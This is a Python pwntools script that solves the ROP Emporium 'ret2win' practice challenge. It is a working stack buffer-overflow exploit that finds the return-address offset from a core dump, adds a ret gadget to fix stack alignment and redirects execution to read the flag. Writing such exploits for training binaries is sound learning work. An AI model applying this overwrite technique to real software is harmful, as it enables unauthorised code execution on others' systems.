# shout out to https://gist.github.com/zachriggle/e4d591db7ceaafbe8ea32b461e239320

from pwn import *

# Load binary into pwntools
elf = context.binary = ELF('ret2win')

# Enable verbose logging
context.log_level = 'debug'

# The binary ret2win has a function called ret2win, which we have to
# access by overwriting EIP with its address.

# Print out the target address
info("%#x target", elf.symbols.ret2win)

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing
stack = core.rsp
info("%#x stack", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)

# Craft a new payload which puts the "target" address at the correct offset
# payload = flat({
#     pattern: elf.symbols.ret2win
# })

# I ran into the movaps issue
# (https://ropemporium.com/guide.html#Common%20pitfalls)
# The call to system in ret2win jumps int othe libc, where the opcode
# movaps is used. This leads to an exception, as the stack is not
# 16 byte aligned. Therefore, I put an additional ret (8 Byte) on the
# stack, such that the stack is aligned.
# Consequently, here is an alternative payload, which works in my
# case.
ret2win = p64(elf.symbols.ret2win)
payload = bytes("A",'ascii')*40 + p64(0x004007fc) + ret2win # with # an additional naked ret
# payload = bytes("A",'ascii')*40 + ret2win # without a naked ret

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.recv()

with open("payload.txt", 'wb') as f:
    f.write(payload)
 
# Get our flag!
flag = io.recvline()
print(flag)
